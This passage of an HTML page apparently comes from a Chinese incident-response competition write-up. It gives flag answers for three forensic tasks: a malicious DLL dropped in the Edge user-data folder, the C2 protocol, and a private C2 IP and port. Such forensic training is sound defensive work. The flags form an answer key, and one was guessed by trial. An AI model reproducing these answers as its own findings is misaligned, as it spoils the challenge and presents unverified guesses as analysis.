+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：二阶段落地文件
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">确定二阶段落地文件最终路径（精确到文件名）。flag格式：flag{落地文件完整路径}
+</span></span></code></pre></div><p>到注册表里找其指向</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326091837238.png" alt=""></p>
+<p>找到路径</p>
+<pre tabindex="0"><code>flag{C:\Users\setadmin\AppData\Local\Microsoft\Edge\User Data\msedge.dll}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务7-2"
+    >
+        任务7
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务7-2" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务7" aria-label="Anchor to: 任务7" href="#%e4%bb%bb%e5%8a%a17-2">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：任务7
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">确认该事件使用的回连通信类型（只写一个词）。flag类型：flag{c2_type}
+</span></span></code></pre></div><p>直接把dll弄出来放到沙箱检测
+结果奇安信情报沙箱好像没分析到应用层协议</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326093215423.png" alt=""></p>
+<p>试出来答案是http</p>
+<pre tabindex="0"><code>flag{http}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务8-1"
+    >
+        任务8
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务8-1" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务8" aria-label="Anchor to: 任务8" href="#%e4%bb%bb%e5%8a%a18-1">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：远控木马回连目的地
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">确定回连目的地（IP:Port），flag格式为：flag{ip:port}
+</span></span></code></pre></div><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326092635725.png" alt=""></p>
+<pre tabindex="0"><code>flag{192.168.0.144:82}
+</code></pre>
+  </article>
+
+
+
+          
+          
+          <div class="gdoc-page__footer flex flex-wrap justify-between">
+            
+              
+
+
+
+
+
+
+
+
+  
+  
+
+  
+    
+    
+
+    
+    
+      
+      
+      
+
+      
+        
+      
+      
+
+      
+
+      
+
+      
+    
+
+    
+    
+      
+  
+  
+
+  
+    
+    
+
+    
+    
+      
+      
+      
+
+      
+        
+      
+      
+
+      
+
+      
+
+      
+    
+
+    
+    
+  
+    
+    
+
+    
+    
+      
+      
+      
+
+      
+        
+      
+      
+
+      
+
+      
+
+      
+    
+
+    
+    
+  
+
+    
+  
+    
+    
+
+    
+    
+      
+      
+      
+
+      
+        
+      
+      
+
+      
+
+      
+
+      
+    
+
+    
+    
+  
+    
+    
+
+    
+    
+      
+      
+      
+
+      
+        
+      
+      
+
+      
+
+      
+
+      
+    
+
+    
+    
+      
+  
+  
+
+  
+    
+    
+
+    
+    
+      
+      
+      
+
+      
+        
+      
+      
+
+      
+
+      
+        
+        
+      
+
+      
+    
+
+    
+    
+  
+
+    
+  
+
+
+
+
+<span class="gdoc-page__nav">
+  
+    <a
+      class="gdoc-page__nav--prev flex align-center"
+      href="/incident-response/"
+      title="应急响应"
+    >
+      <i class="gdoc-icon">gdoc_arrow_left_alt</i>
+      应急响应
+    </a>
+  
+</span>
+<span class="gdoc-page__nav">
+  
+</span>
+
+            
+          </div>
+          
+        </div>
+      </main>
+
+      <footer class="gdoc-footer">
+  <nav class="container flex">
+    <div>
+      <section class="flex flex-wrap align-center">
+        <span class="gdoc-footer__item gdoc-footer__item--row">
+          Built with <a href="https://gohugo.io/" class="gdoc-footer__link">Hugo</a> and <svg class="gdoc-icon gdoc_heart"><use xlink:href="#gdoc_heart"></use></svg>
+
+        </span>
+        
+        
+      </section>
+      
+    </div>
+    
+      <div class="flex flex-25 justify-end">
+        <span class="gdoc-footer__item text-right">
+          <a class="gdoc-footer__link fake-link" href="#" aria-label="Back to top">
+            <svg class="gdoc-icon gdoc_keyboard_arrow_up">
+              <use xlink:href="#gdoc_keyboard_arrow_up"></use>
+            </svg>
+            <span class="hidden-mobile">Back to top</span>
+          </a>
+        </span>
+      </div>
+    
+  </nav>
+</footer>
+
+    </div>
+
+    
+  </body>
+</html>
